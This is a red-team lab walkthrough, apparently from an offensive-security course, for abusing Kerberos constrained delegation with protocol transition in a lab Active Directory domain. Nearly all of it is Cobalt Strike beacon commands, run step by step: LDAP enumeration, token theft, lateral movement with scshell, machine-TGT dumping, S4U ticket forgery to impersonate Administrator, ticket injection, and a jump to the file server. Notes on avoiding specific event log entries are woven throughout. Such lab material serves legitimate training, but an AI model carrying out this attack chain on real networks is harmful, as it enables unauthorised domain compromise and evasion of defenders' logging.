# Constrained Delegation (with protocol transition) Lab

>The objective of this lab is to abuse constrained delegation with protocol transition to obtain access to a back-end service.

## Enumeration

1. Launch Cobalt Strike and connect to the team server.

```cs
sleep 5 5
ps
ppid 12832
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
getuid
```

2. Search for computers whose *msDS-AllowedToDelegateTo* attribute is not null.
  
```Beacon-nocolor
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

⚠️ This should return *lon-ws-1$*, which is permitted to delegate to *cifs/lon-fs-1*.

3. Use PowerShell to check that the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.

```Terminal-nocolor
[Convert]::ToBoolean(16781312 -band 16777216)
```

⚠️ This should return *True*.

4. Move laterally to *lon-ws-1* — you need a SYSTEM beacon on that host to dump its machine account TGT.

> **Why SYSTEM on lon-ws-1?** The constrained delegation abuse in the next phase requires the lon-ws-1$ machine account TGT (LUID `0x3e7`). Only SYSTEM can read the machine account's Kerberos session. A user-context beacon is not sufficient.

## Impersonate rsteel Workstation Admin on lon-ws-1

```cs
ps                              // find rsteel process — look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
steal_token <rsteel-cmd-pid>        // OPSEC-🟢SAFE — token dup in-process, no Event 4648
```

## Jump to lon-ws-1 

```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-ws-1 smb
```

## Escalate to SYSTEM on lon-ws-1 beacon**

The new beacon lands as `CONTOSO\rsteel`. You need SYSTEM to read `lon-ws-1$` machine account TGT:

```cs
// New beacon on lon-ws-1:
beacon> getuid                                  // confirm rsteel context
beacon> steal_token <SYSTEM-pid>               // steal token from any SYSTEM process (e.g. svchost.exe)
beacon> getuid                                  // confirm NT AUTHORITY\SYSTEM
```


## Exploitation

1. Dump the TGT for *lon-ws-1* computer and observe the hex LUID is `3x7`  

```Beacon-nocolor
sleep 5 5
ps
ppid 844
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
getuid

krb_triage
krb_dump /luid:3e7 /service:krbtgt


krb_s4u /ticket:[base64_output_direct_fromkrb_dump_TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator

krb_describe /ticket:[base64_output_direct_fromkrb_dump_TGT]
```

3. Use the S4U ticket to access the C$ share on *lon-fs-1* as Administrator.

> The S4U ticket is for `cifs/lon-fs-1` impersonating `Administrator` — inject it into a sacrificial logon session and access the share directly. No need to know Administrator's password.

```cs
// Step 1 — Create sacrificial logon session (OPSEC-🟠CAUTION — Event 4648)
beacon> make_token CONTOSO\Administrator FakePass!
// Password is irrelevant — the S4U ticket provides the actual Kerberos auth

// Step 2 — Save the S4U ticket kirbi to attacker desktop (run in attacker PowerShell, NOT beacon)
```

On the Attacker Desktop PowerShell (not in beacon — avoids child process):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64 TICKET from krb_s4u output]"))
```

>Back in beacon:  

```cs
// Step 3 — Inject S4U ticket into the logon session (OPSEC-🟠CAUTION)
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi

// Step 4 — Verify access (OPSEC-🟢SAFE — built-in beacon command, no child process)
beacon> ls \\lon-fs-1\c$

//jump 
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-fs-1 smb
```

## new beacon lon-fs-1

```cs
ls c:\
powerpick [System.IO.File]::WriteAllText("C:\rto.txt","Juan Botes")
powerpick gc C:\rto.txt
```

⚠️ In this lab, you have learned how to abuse constrained delegation (with protocol transition) to impersonate any user to the delegated service.
